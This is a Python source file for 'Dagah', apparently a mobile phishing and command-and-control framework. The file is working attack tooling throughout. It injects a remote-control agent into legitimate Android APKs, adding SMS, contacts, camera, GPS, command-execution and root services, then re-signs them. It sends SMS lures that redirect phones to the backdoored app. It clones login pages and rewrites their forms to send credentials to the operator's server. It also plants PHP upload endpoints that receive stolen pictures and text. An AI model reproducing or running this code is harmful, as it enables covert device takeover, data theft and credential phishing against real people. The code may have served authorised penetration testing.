#!/usr/bin/python
import os
import sys
import time
import subprocess
import signal
import getopt
import re
import xml.etree.ElementTree as ET
import zipfile
from lib.config import Config
from lib.db import DB, DBException
config = Config('config')
def usage():
    print "Dagah (Shevirah Phishing) Usage:"
    print "Options:"
    print "-Modem <type> of attach mobile modem (app/usb)"
    print "\t-n <phone number> of modem"
    print "\t-u <url on webserver> where modem checks in"
    print "\t-k <key> to control modem"
    print "-Phish <phishing attack> (basic,harvester,autopwn,autoagent)"
    print "\t-u <url on webserver>"
    print "\t-d <delivery method> (sms/nfc)"
    print "\t-n/-N <number/file of numbers> to attack"
    #print "\t-p <page name>"
    print "\t-t <custom text> for SMS"
    print "\t-c <page> to clone for credential harvester"
    print "\t-f <file> to import"
    print "\t-l <label> for campaign"
    print "\t-a <app(s)> to backdoor"
    print "\t-k <key> to control app"
    #print "\t-s <appstore> link for hosted app (official or third party)"
    print "\t-s <signing> mechanism (masterkey,keystore file location)"
    print "\t-p <password> for keystore"
    print "\t-j <jarsigner> alias"
    print "-Agent <function> (list,command)"
    print "\t-n <number> of agent"
    print "\t-d <delivery method> (http,sms)"
    print "\t-c <command>"
    print "\t-p <parameters> for command (name:value pairs (see command help))"
    print "-API <API> Start API (REST)"
    print "\t-u <url on webserver> for API"
    print "\t-k <api key>"
    print "-Stop <poller> to shutdown (api, modem, agent,all)"
    print "-Report <reporting function> (get, drop)"
def main(argv):
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv[2:], "n:u:k:Stop:c:N:p:t:d:l:f:a:s:j:")
    except getopt.GetoptError:
        usage()
        sys.exit()
    modem = False
    api = False
    phish = False
    stop = False
    report = False
    agent = False
    key = "KEYKEY1"
    url = "/modemtest"
    page = "/index.html"
    clone = None
    campaignlabel = "blank"
    number = None 
    file = None
    agentlist = None
    numberfile = None
    appstore = None
    backdoorapp = None
    keystore = None
    jarsignalias = None
    keypass = None
    signing = None
    command = None
    text = None
    agentparam = None
    agentparameters = None
    deliverymethod = "HTTP"
    if argv[0] == '-Modem':
	modem = True
    if argv[0] == '-API':
                api = True
    if argv[0] == '-Phish':
                phish = True
                phishtype = argv[1]
    if argv[0] == '-Stop':
		stop = True
		poller = argv[1]
    if argv[0] == '-Report':
                report = True
                reporttype = argv[1]
    if argv[0] == '-Agent':
		agent = True
		agentparam = argv[1]
    for opt, arg in opts:
	if opt == '-n':
		number = arg
	if opt == '-N':
                numberfile = arg
	if opt == '-u':
		url = arg
                if url[0] != '/':
		  url = "/" + url
        if opt == '-p':
                page = arg
                agentparameters = arg
                if page[0] != '/':
                   page = "/" + page
                keypass = arg
	if opt == '-k':
		key = arg
        if opt == '-d':
                deliverymethod = arg
        if opt == '-t':
                text = arg
        if opt == '-f':
                file = arg
        if opt == '-s':
		appstore = arg
        if opt == '-c':
                clone = arg
                command = arg
        if opt == '-l':
                campaignlabel = arg
        if opt == '-a':
		backdoorapp = arg
        if opt == '-s':
		signing = arg
        if opt == '-j':
		jarsignalias = arg
    if agent == True:
	if agentparam == "list":
		list_live_agents()
        if agentparam == "command":
		if number == None and agentparameters == None:
			list_agent_commands()
		else:
			agentcommand(number,command,agentparameters,deliverymethod) 
    if modem == True:
       
	make_modem(number,url,key)
    if api == True:
	make_api(url,key)
    if stop == True:
	stop_poller(poller)
    if report == True:
         reporter(reporttype)
    if phish == True:
       if phishtype == "basic":
	    basicphish(url,text,number,numberfile,campaignlabel)
       if phishtype == "harvester":
	    harvesterphish(url,text,number,numberfile,campaignlabel,clone,page)
       if phishtype == "autoagent":
	    autoagentphish(url,text,number,numberfile,page,appstore,backdoorapp,key,signing,jarsignalias,keypass,deliverymethod)


def agentcommand(number,command,agentparameters,deliverymethod):
	if command == 1 or command == "SPAM":      
		params = agentparameters.split(",")
        	for x in range(0,len(params)):
                	param = params[x].split(":")
			if param[0] == "target":
				target = param[1]
			elif param[0] == "message":
				textmessage = param[1]
		if deliverymethod.lower() == "http":
			sendcommandhttp(number,command + " none http " + target + " " + textmessage)
	elif command == "EXEC":
		params = agentparameters.split(",")
                for x in range(0,len(params)):
                        param = params[x].split(":")
                        if param[0] == "downloaded":
                                downloaded = param[1]
                        elif param[0] == "syntax":
                                syntax = param[1]
		if deliverymethod.lower() == "http":
	                        sendcommandhttp(number,command + " none http " + downloaded + " " + syntax)

        elif command == "DOWN":
		params = agentparameters.split(",")
                for x in range(0,len(params)):
                        param = params[x].split(":")
                        if param[0] == "file":
	                        filetocopy = param[1]
	  	webserver = config.get("WEBSERVER")
 		db = DB(config=config)
         	db.query("SELECT path from agents where number=%s", (number,))
         	path = db.fetchone()[0]
		fullpath = webserver + path
       		command1 = "mkdir -p " + fullpath
        	os.system(command1)
		files = filetocopy.split("/")
		filename = files[len(files)-1]
        	command2 = "cp " + filetocopy + " " + webserver + path + "/" + filename
       	 	os.system(command2)
                if deliverymethod.lower() == "http":
                        sendcommandhttp(number,command + " none http " + path + " /" + filename)

def sendcommandhttp(number,command):
	 webserver = config.get("WEBSERVER")
	 db = DB(config=config)
	 db.query("SELECT id from agents where number=%s", (number,))
         id = db.fetchone()[0]
         db.query("SELECT controlkey from agents where id=%s", (id,))
         key = db.fetchone()[0]
         db.query("SELECT path from agents where id=%s", (id,))
         path = db.fetchone()[0].replace('"', '')
	 command = key + " " + command  + "\n"
         control = webserver + path + "/putfunc"
         f = open(control, 'w')
         f.write(command)
         f.close()


			

def list_agent_commands():
	print "\n\nCommands:\n"
        print "\t1.) Send SMS (SPAM)"
        print "\t2.) Take Picture (PICT)"
        print "\t3.) Get Contacts (CONT)"
        print "\t4.) Get SMS Database (SMSS)"
        print "\t5.) Privilege Escalation (ROOT)"
        print "\t6.) Download File (DOWN)"
        print "\t7.) Execute Command (EXEC)"
        print "\t8.) Upload File (UPLD)"
        print "\t9.) Ping Sweep (PING)"
        print "\t10.) TCP Listener (LIST)"
        print "\t11.) Connect to Listener (CONN)"
        print "\t12.) Run Nmap (NMAP)"
        print "\t13.) Execute Command and Upload Results (EXUP)"
        print "\t14.) Get Installed Apps List (APPS)"
        print "\t15.) Remove Locks (Android < 4.4) (LOCK)"
        print "\t16.) Upload APK (UAPK)"
        print "\t17.) Get Wifi IP Address (IPAD)"


def list_live_agents():
    print "Live Agents:"
    if check_mysql() == 0:
        os.system("service mysql start>/dev/null")
    try:
            db = DB(config=config)
    except DBException as e:
        if e[0] == 2:
                   os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))

        else:
                raise
    db = DB(config=config)

    table = "agents"
    db.query("SELECT COUNT(*) from agents")
    row = db.fetchone()[0]
    for i in range(1, row+1):
            db.query("SELECT number from agents where id=%s", (i, ))
            r = db.fetchone()[0]
	    db.query("SELECT active from agents where id=%s", (i, ))
	    s = db.fetchone()[0]
            if s == "Y":
            	print "\t " + r


def database_add_agents_1(number, path, key, number2, platform,deliverymethod):
    if check_mysql() == 0:
        os.system("service mysql start")
    try:
            db = DB(config=config)
    except DBException as e:
        if e[0] == 2:
                   os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))

        else:
                raise
    db = DB(config=config)

    table = "agents"
    table2 = "agentsdata"
    _type = config.get("DATABASETYPE")

    db = DB(config=config)

    db.query("INSERT INTO "+table+" (id,number,path,controlkey,controlnumber,platform,osversion,deliverymethod,active) VALUES (DEFAULT,%s,%s,%s,%s,%s,%s,%s,%s)", (number,path,key,number2,platform,"NULL",deliverymethod,"N"))
    db.query("INSERT INTO "+table2+" (id,sms,contacts,picture,root,packages,apk) VALUES (DEFAULT, NULL, NULL, NULL, NULL, NULL, NULL)")

def make_agent_files(path):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    command11 = "chmod 777 " + fullpath
    os.system(command11)
    controlfile = fullpath + "/control"
    command2 = "touch " + controlfile
    os.system(command2)
    command3 = "chmod 777 " + controlfile
    os.system(command3)
    picturefile = fullpath + "/picture.jpg"
    command4 = "touch " + picturefile
    os.system(command4)
    command5 = "chmod 777 " + picturefile
    os.system(command5)
    textfile = fullpath + "/text.txt"
    command6 = "touch " + textfile
    os.system(command6)
    command7 = "chmod 777 " + textfile
    os.system(command7)
    pictureupload = fullpath + "/pictureupload.php"
    command8 = "touch " + pictureupload
    os.system(command8)
    command9 = "chmod 777 " + pictureupload
    os.system(command9)
    pictureuploadtext = "<?php\n$base=$_REQUEST['picture'];\necho $base;\n$binary=base64_decode($base);\nheader('Content-Type: bitmap; charset=utf-8');\n$file = fopen('picture.jpg', 'wb');\nfwrite($file, $binary);\nfclose($file);\n?>";
    f = open(pictureupload, 'w')
    f.write(pictureuploadtext)
    f.close()
    textupload = fullpath + "/textuploader.php"
    command10 = "touch " + textupload
    os.system(command10)
    command11 = "chmod 777 " + textupload
    os.system(command11)
    textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text.txt', 'wb');\nfwrite($file, $base);\n?>";
    f = open(textupload, 'w')
    f.write(textuploadtext)
    f.close()
    controlupload = fullpath + "/controluploader.php"
    command12 = "touch " + controlupload
    os.system(command12)
    command13 = "chmod 777 " + controlupload
    os.system(command13)
    controluploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('control','wb');\nfwrite($file, $base);\n?>";
    f = open(controlupload, 'w')
    f.write(controluploadtext)
    f.close()
    putfile = fullpath + "/putfunc"
    command14 = "touch " + putfile
    os.system(command14)
    command15 = "chmod 777 " + putfile
    os.system(command15)
    appupload = fullpath + "/apkupload.php"
    command12 = "touch " + appupload
    os.system(command12)
    command13 = "chmod 777 " + appupload
    os.system(command13)
    appuploadtext = "<?php\n$file_path = basename( $_FILES['uploadedfile']['name']);\n$f = fopen('text.txt', 'wb');\n$data = $file_path;\nfwrite($f, $data);\nfclose($f);\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $file_path)) {\necho 'success';\n} else{\necho 'fail';\n}\n?>"
    APPUPFILE = open(appupload, 'w')
    APPUPFILE.write(appuploadtext)
    APPUPFILE.close()



def autoagentphish(url,text,number,numberfile,page,appstore,backdoorapp,key,signing,jarsignalias,keypass,deliverymethod):
    if text == None:
        text = "This is a cool app: "
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    androidagent = config.get("ANDROIDAGENT")
    deletecontents(androidagent)
    iphoneagent = config.get("IPHONEAGENT")
    if check_mysql() == 0:
        os.system("service mysql start")
    try:
            db = DB(config=config)
    except DBException as e:
        if e[0] == 2:
                   os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))

        else:
                raise
    db = DB(config=config)
    db.query("create table if not exists agents (id SERIAL NOT NULL PRIMARY KEY, number varchar(12),path varchar(1000), controlkey varchar(7), controlnumber varchar(12), platform varchar(12), osversion varchar(10),deliverymethod varchar(10),active varchar(3))")
    db.query("create table if not exists agentsdata (id SERIAL NOT NULL PRIMARY KEY, sms varchar(2000),contacts varchar(1000), picture varchar(100), root varchar(50), ping varchar(2000), file varchar(100), packages varchar(10000), apk varchar(100), ipaddress varchar(16))")
    modem = 1
    db.query("SELECT number from modems where id=%s", (modem,))
    number2 = db.fetchone()[0]
    localpath = webserver + url
    if not os.path.exists(localpath):
            command1  = "mkdir " + localpath
            os.system(command1)
    if backdoorapp != None:
    	if number != None:
		androidbackdoor(backdoorapp,number,key,url,signing,jarsignalias,keypass,deliverymethod)
                database_add_agents_1(number, "/" + number, key, number2, "Android")
                page = "/" + number + ".php"
                sploitfile = localpath + page
                command8   = "touch " + sploitfile
                os.system(command8)
                command9 = "chmod 777 " + sploitfile
                os.system(command9)
                pagetext = "<?php\n$iphone = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"iPhone\");\n$android = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"Android\");\nif\n($iphone == true)\n{header(\'Location: http://" + ipaddress + url + "/iphoneagent.deb\');}\nelseif ($android == true){\nheader(\'Location: http://" + ipaddress + url + "/" + number + ".apk\');};\n?>"
                SPLOITFILE = open(sploitfile, 'w')
                SPLOITFILE.write(pagetext)
                SPLOITFILE.close()
                make_agent_files("/" + number)
                link = "http://" + ipaddress + url + page
                fulltext = text + " " + link
                sendsms(line,fulltext)
	elif numberfile != None:
                 with open(numberfile) as f:
                    lines = f.readlines()
                    for line in lines:
                        line = line.strip()
			androidbackdoor(backdoorapp,line,key,url,signing,jarsignalias,keypass,deliverymethod)
                        database_add_agents_1(line, "/" + line, key, number2, "Android",deliverymethod)
			page = "/" + line + ".php"
    			sploitfile = localpath + page
    			command8   = "touch " + sploitfile
    			os.system(command8)
    			command9 = "chmod 777 " + sploitfile
    			os.system(command9)
                        pagetext = "<?php\n$iphone = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"iPhone\");\n$android = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"Android\");\nif\n($iphone == true)\n{header(\'Location: http://" + ipaddress + url + "/iphoneagent.deb\');}\nelseif ($android == true){\nheader(\'Location: http://" + ipaddress + url + "/" + line + ".apk\');};\n?>"
    			SPLOITFILE = open(sploitfile, 'w')
    			SPLOITFILE.write(pagetext)
    			SPLOITFILE.close()
                        make_agent_files("/" + line)
                        link = "http://" + ipaddress + url + page
			fulltext = text + " " + link
                        sendsms(line,fulltext)
    copy1 = "cp " + androidagent + "*" + " " + localpath + "/"
    os.system(copy1)
    startcommand = "python agentattachpoller.py > log"
    pid = os.fork()
    if pid == 0:
                os.system(startcommand)

def deletecontents(folder):
	for the_file in os.listdir(folder):
    		file_path = os.path.join(folder, the_file)
        	if os.path.isfile(file_path):
            		os.unlink(file_path)
def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,deliverymethod):
 	  apktoolloc = config.get("APKTOOLLOC")
          apksloc = config.get("APKSLOC")
          os.chdir(apksloc)
          copycom = "cp -rf AndroidAgentBAK AndroidAgent"
          os.system(copycom) 
          decompile = apktoolloc + "/apktool d " + inputfile + ">/dev/null"
          os.system(decompile)
          path,file = os.path.split(inputfile)
          foldername = file[:-4]
          ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
          tree = ET.ElementTree()
          tree.parse(foldername + "/AndroidManifest.xml")
          root = tree.getroot()
          package = root.get('package')
          for child in root:
             if child.tag == "application":
                app = child
                for child in app:
                        if child.tag == "activity":
                                act = child
                                for child in act:
                                        if child.tag == "intent-filter":
                                                filter = child
                                                for child in filter:  
                                                        if (filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                                             if (filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                                                        mainact =  act.get('{http://schemas.android.com/apk/res/android}name')
                                                                        if mainact[0] == ".":
                                                                             mainact = package + mainact
                                                                        act.remove(filter)
                                                                        tree.write("output.xml")
                                                                        break
          movecommand = "mv output.xml " + foldername  + "/AndroidManifest.xml"
          os.system(movecommand)
          mainactsplit = mainact.split(".")
          length = len(mainactsplit)
          classname = mainactsplit[length - 1]
          package = mainactsplit[0] + "."
          for x in range(1, (length - 2)):
                 add = mainactsplit[x] + "."
          	 package += add
          package += mainactsplit[length - 2]
          appmain = package + "." + classname + ".class"
          mainfile = "AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"
          inject = "\n        Intent intent2 = new Intent(getApplicationContext(), " + appmain +  ");\nstartActivity(intent2);\n"
          with open(mainfile, 'r') as f:
              fc = f.read()
          with open(mainfile, 'w') as f:
              f.write(re.sub(r'(finish)', r'%s\1'%inject, fc, count=1))
          newfolder = "src/" + mainactsplit[0] + "/"
          os.system("mkdir AndroidAgent/" + newfolder + ">/dev/null")
          for x in range(1, (length - 1)):
              add = mainactsplit[x] + "/"
              newfolder += add
              os.system("mkdir AndroidAgent/" + newfolder + ">/dev/null")  
          fullclasspath =  "AndroidAgent/" + newfolder + classname + ".java"
          os.system("touch " + fullclasspath)
          f = open(fullclasspath, 'w')
          line1 = "package " + package + ";\n"
          line2 = "import android.app.Activity;\n"
          line3 = "public class " + classname + " extends Activity {\n"
          line4 = "}\n"
          f.write(line1)
          f.write(line2)
          f.write(line3)
          f.write(line4)
          f.close()
          androidsdk = config.get("ANDROIDSDK")
          command = androidsdk + "/tools/android update project --name AndroidAgent" + " --path " + "AndroidAgent/" + ">/dev/null"
          os.system(command)
          command = "ant -f " + "AndroidAgent" +  "/build.xml clean debug"  + ">/dev/null"
          #command = "ant -f " + "AndroidAgent" + "/build.xml release" 
          os.system(command)
          decompile = apktoolloc + "/apktool d " + "AndroidAgent/bin/AndroidAgent-debug.apk" + " -o AndroidAgent2/"  + ">/dev/null"
          os.system(decompile)
          os.system("mkdir " + foldername + "/smali/com")
          os.system("cp -rf AndroidAgent2/smali/com/bulbsecurity " + foldername + "/smali/com/")
          os.system("mkdir " + foldername + "/smali/jackpal")
          os.system("cp -rf AndroidAgent2/smali/jackpal " + foldername + "/smali/")
          manifestfile = foldername + "/AndroidManifest.xml"
          inject = """
          <receiver android:name="com.bulbsecurity.framework.SMSReceiver">
          <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
          </receiver>
          <service android:name="com.bulbsecurity.framework.SMSService">
          </service>
          <receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr">
          <intent-filter ><action android:name="android.intent.action.BOOT_COMPLETED"></action></intent-filter>
          </receiver>
          <receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"></receiver>
          <service android:name="com.bulbsecurity.framework.CommandHandler">
          </service>
          <service android:name="com.bulbsecurity.framework.PingSweep">
          </service>
          <service android:name="com.bulbsecurity.framework.SMSGet">
          </service>
          <service android:name="com.bulbsecurity.framework.ContactsGet">
          </service>
          <service android:name="com.bulbsecurity.framework.InternetPoller">
          </service>
          <service android:name="com.bulbsecurity.framework.WebUploadService">
          </service>
          <service android:name="com.bulbsecurity.framework.PictureService">
          </service>
          <service android:name="com.bulbsecurity.framework.Download">
          </service>
          <service android:name="com.bulbsecurity.framework.Execute">
          </service>
          <service android:name="com.bulbsecurity.framework.GetGPS">
          </service>
	  <service android:name="com.bulbsecurity.framework.IPGet">
          </service>
          <service android:name="com.bulbsecurity.framework.Checkin">
          </service>
          <service android:name="com.bulbsecurity.framework.Listener"></service>
          <service android:name="com.bulbsecurity.framework.Phase1" android:process=":three">
          </service>
          <service android:name="com.bulbsecurity.framework.Phase2" android:process=":two">
          </service>
          <service android:name="com.bulbsecurity.framework.Exynos"></service>
          <service android:name="com.bulbsecurity.framework.Upload"></service>
          <activity android:name="com.bulbsecurity.framework.AndroidAgentActivity">
          <intent-filter>
          <action android:name="android.intent.action.MAIN" />
          <category android:name="android.intent.category.LAUNCHER" />
          </intent-filter>
          </activity>
          """
          with open(manifestfile, 'r') as f:
              fc = f.read()
          with open(manifestfile, 'w') as f:
              f.write(re.sub(r'(<\/application>)', r'%s\1'%inject, fc, count=1))
          inject = """
          <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
          <uses-permission android:name="android.permission.INTERNET" />
          <uses-permission android:name="android.permission.RECEIVE_SMS"/>
          <uses-permission android:name="android.permission.SEND_SMS"/>
          <uses-permission android:name="android.permission.CAMERA"/>
          <uses-permission android:name="android.permission.READ_CONTACTS"/>
          <uses-permission android:name="android.permission.INTERNET"/>
          <uses-permission android:name="android.permission.READ_SMS"/>
          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
          <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
          <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
          <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
          <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
          <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
          """
          with open(manifestfile, 'r') as f:
               fc = f.read()
          with open(manifestfile, 'w') as f:
               f.write(re.sub(r'(<uses-permission)', r'%s\1'%inject, fc, count=1))
          stringfile = foldername + "/res/values/strings.xml" 
          inject = """
          <string name="key">KEYKEY1</string>
          <string name="controlnumber">155552155554</string>
          <string name="controlIP">192.168.1.108</string>
          <string name="urii">/control</string>
          <string name="controlpath">/androidagent1</string>
          """
          if os.path.exists(stringfile):
               with open(stringfile, 'r') as f:
                    fc = f.read()
               with open(stringfile, 'w') as f:
                    f.write(re.sub(r'(<\/resources>)', r'%s\1'%inject, fc, count=1))
          else:
               inject2 = """
               <?xml version="1.0" encoding="utf-8"?>
               <resources>
               """
               os.system("touch " + stringfile)
               with open(stringfile, 'w') as f:
                  f.write(inject2)  
                  f.write(inject)
                  f.write("</resources>")
	  modem = 1
          db = DB(config=config)
          controlpath = "/" + number
          controlkey = key
          db.query("SELECT number from modems where id=%s", (modem,))
          controlphone = db.fetchone()[0]
          ipaddress = config.get("IPADDRESS")
          fullpath1 = apksloc + "/" + foldername + "/res/values/strings.xml"
          command = "sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" + controlkey + "<\\/string>/' " + fullpath1
          os.system(command)
          command = "sed -i \'s/<string name=\"controlnumber\">.*/<string name=\"controlnumber\">" + controlphone + "<\\/string>/' " + fullpath1
          os.system(command)
          command = "sed -i \'s/<string name=\"controlIP\">.*/<string name=\"controlIP\">" + ipaddress + "<\\/string>/' " + fullpath1
          os.system(command)
          command = "sed -i \'s/<string name=\"controlpath\">.*/<string name=\"controlpath\">\\" + controlpath + "<\\/string>/' " + fullpath1
          os.system(command)
          xml_path = foldername + '/res/values/styles.xml'
          if os.path.exists(xml_path):
              tree = ET.parse(xml_path)
              for child in tree.findall('.//*[@parent]'):
                    if child.get('parent').startswith('@*android:style/'):
                        new_parent = child.get('parent').replace('@*android:style/','@android:style/')
                        child.set('parent', new_parent)
              tree.write(xml_path)
          os.environ["PATH"] = os.environ["PATH"] + ":" + apktoolloc
          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk"  + ">/dev/null"
          os.system(compile)
          remove = "rm -rf " + foldername 
          os.system(remove)
          decomp = apktoolloc + "/apktool d Backdoored/" + foldername + ".apk -o" + foldername + "/"    + ">/dev/null"
          os.system(decomp)
          tree = ET.ElementTree()
          tree.parse(foldername + "/res/values/public.xml")
          root = tree.getroot()
          for child in root:
              if (child.get('name') == "key" ):
                  newkeyvalue = child.get('id')
              if (child.get('name') == "urii" ):
                  newuriivalue = child.get('id')
              if (child.get('name') == "controlIP" ):
                  newcontrolIPvalue = child.get('id')
              if (child.get('name') == "controlnumber" ):
                  newcontrolnumbervalue = child.get('id')
              if (child.get('name') == "controlpath" ):
                  newcontrolpathvalue = child.get('id')
          oldkeyvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep key | cut -d" " -f7').read().strip()
          olduriivalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep urii | cut -d" " -f7').read().strip()
          oldcontrolIPvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlIP | cut -d" " -f7').read().strip()
          oldcontrolpathvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlpath | cut -d" " -f7').read().strip()
          oldcontrolnumbervalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlnumber | cut -d" " -f7').read().strip()
          for dname, dirs, files in os.walk(foldername + "/smali/com/bulbsecurity/framework"):
              for fname in files:
                  fpath = os.path.join(dname, fname)
                  with open(fpath) as f:
                    s = f.read()
                    s = s.replace(oldkeyvalue, newkeyvalue)
                    s = s.replace(olduriivalue, newuriivalue)
                    s = s.replace(oldcontrolIPvalue, newcontrolIPvalue)
                    s = s.replace(oldcontrolpathvalue, newcontrolpathvalue)
                    s = s.replace(oldcontrolnumbervalue, newcontrolnumbervalue)
                  with open(fpath, "w") as f:
                    f.write(s)
          xml_path = foldername + '/res/values/styles.xml'
          if os.path.exists(xml_path):
              tree = ET.parse(xml_path)
              for child in tree.findall('.//*[@parent]'):
                  if child.get('parent').startswith('@*android:style/'):
                      new_parent = child.get('parent').replace('@*android:style/','@android:style/')
                      child.set('parent', new_parent)
              tree.write(xml_path)
          remove = "rm Backdoored/" + foldername + ".apk"
          os.system(remove)
          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk" + ">/dev/null"
          os.system(compile)
          if signing == None: 
		signing = config.get("KEYSTORELOC")
          if signing != "master":      
                if jarsignalias == None:
                      jarsignalias = config.get("KEYALIAS")
                if keypass == None:
			keypass = config.get("KEYPASS")
                signcommand =  "jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore " + signing +" -storepass " + keypass + " Backdoored/" + foldername + ".apk " +  jarsignalias + ">/dev/null"
                os.system(signcommand)
                androidagentlocation = config.get("ANDROIDAGENT")
                copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation + number + ".apk"
                os.system(copycommand)
          if signing == "master":
                unzipcom = "unzip " + inputfile + " -d unzipped/"
                os.system(unzipcom)
                os.chdir("unzipped")
                currentdir = os.getcwd()
                zip = zipfile.ZipFile("../Backdoored/" + foldername + ".apk", "a")
                for root, subFolders, files in os.walk(currentdir):
                        for file in files:
                                file2 = os.path.join(root.replace(currentdir, "", 1), file).lstrip('/')
                                zip.write(file2)
                zip.close()
                os.chdir("..")
                androidagentlocation = config.get("ANDROIDAGENT")
                copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation + number + ".apk"
                os.system(copycommand)
                remove = "rm -rf unzipped"
                os.system(remove)
          rem = "rm -rf " + foldername
          os.system(rem)
          rem = "rm -rf AndroidAgent"
          os.system(rem)
          rem = "rm -rf AndroidAgent2"
          os.system(rem)
          dagahloc = config.get("DAGAHLOC")
          os.chdir(dagahloc)
	  print "Backdoored " + inputfile + " for " + number
def harvesterphish(url,text,number,numberfile,campaignlabel,clone,page):
         if text == None:
		text = "This is a cool page: "
	 webserver = config.get('WEBSERVER')
       	 ipaddress = config.get('IPADDRESS')
         localpath = webserver + url
         if not os.path.exists(localpath):
            command1  = "mkdir " + localpath
            os.system(command1)
         results = localpath + "/results"
         command8   = "touch " + results
         os.system(command8)
         command9 = "chmod 777 " + results
         os.system(command9)
         campaign_db(campaignlabel,url,"harvester")
	 print clone
	 if clone != None:
             if clone[:7].lower() != "https:/" and clone[:7].lower() != "http://" :
                clone = "http://" + clone
	     clonepage(clone,url,page)
	     dagahdir = os.getcwd()
             clonesdir = config.get("CLONESLOC")
             fullpath = dagahdir + "/" + clonesdir
             copy2 = "cp " + fullpath + "/post.php " + webserver + url + "/post.php"
	     os.system(copy2)
	     read=file(webserver + url + "/post.php","r").readlines()
	     write=file(webserver + url + "/post.php","w")
             for line in read:
	         match=re.search('url',line, flags=re.IGNORECASE)
	         if match:
        	      line=re.sub('url=MYURL', 'url=%s ' % (clone), line)
	         write.write(line)
             write.close()
	     link = "http://" + ipaddress + url + page
  	     if number != None:
                fulltext = text + " " + link
                sendsms(number,fulltext)
       	     elif numberfile != None:
                 with open(numberfile) as f:
                    lines = f.readlines()
                    for line in lines:
                        line = line.strip()
                        fulltext = text +" " +link
                        sendsms(line,fulltext)
		
	
def clonepage(clone,url,page):
         dagahdir = os.getcwd()
	 clonesdir = config.get("CLONESLOC")
	 useragent = config.get("USERAGENT")
	 fullpath = dagahdir + "/" + clonesdir
         subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (fullpath,useragent,clone), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	 redirect(fullpath + "/index.html",url)
         webserver = config.get("WEBSERVER")
         copy1 = "cp " + fullpath + "/index.html" + " " + webserver + url + page
	 os.system(copy1)
	 remove = "rm " + fullpath + "/index.html"
	 os.system(remove)

def redirect(page,url):
        ipaddress = config.get('IPADDRESS')
	read=file(page,"r").readlines()
	write=file(page,"w")
	for line in read:
		match=re.search('post',line, flags=re.IGNORECASE)
		method_post=re.search("method=post", line, flags=re.IGNORECASE)
		if match or method_post:
        		line=re.sub('action="http?\w://[\w.\?=/&]*/', 'action="http://%s%s/post.php" ' % (ipaddress,url), line)
		write.write(line)
	write.close()




def reporter(reporttype):
	if reporttype.lower() == "drop": 
		 db = DB(config=config)
	
                 db.query("DROP TABLE IF EXISTS results")
                 db.query("DROP TABLES IF EXISTS campaigns")
        if reporttype.lower() == "get":
                webserver = config.get('WEBSERVER')
 		db = DB(config=config)
		db.query("create table if not exists basicresults (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000), path varchar(1000), number varchar(12), timestamp varchar(1000), agent varchar(1000))")
        	row = db.fetchone()[0]
        	db.query("SELECT COUNT(*) from campaigns")
                row = db.fetchone()[0]

        	for i in range(1, row+1):
          		db.query("SELECT path from campaigns where id=%s", (i))
           		url = db.fetchone()[0]
                        db.query("SELECT label from campaigns where id=%s", (i))
                        label = db.fetchone()[0]
		        db.query("SELECT type from campaigns where id=%s", (i))
			type = db.fetchone()[0]
			if type == "basic":
				filename = webserver + url + "/results"
				print label + ":" 
				with open(filename) as f:
                   			lines = f.readlines()
                   			for line in lines:
                        			line = line.strip()
						print line
                                        	stringsplit = line.split(" ",2)
                                        	timestamp = stringsplit[0]
                                        	number = stringsplit[1]
                                        	agent = stringsplit[2]
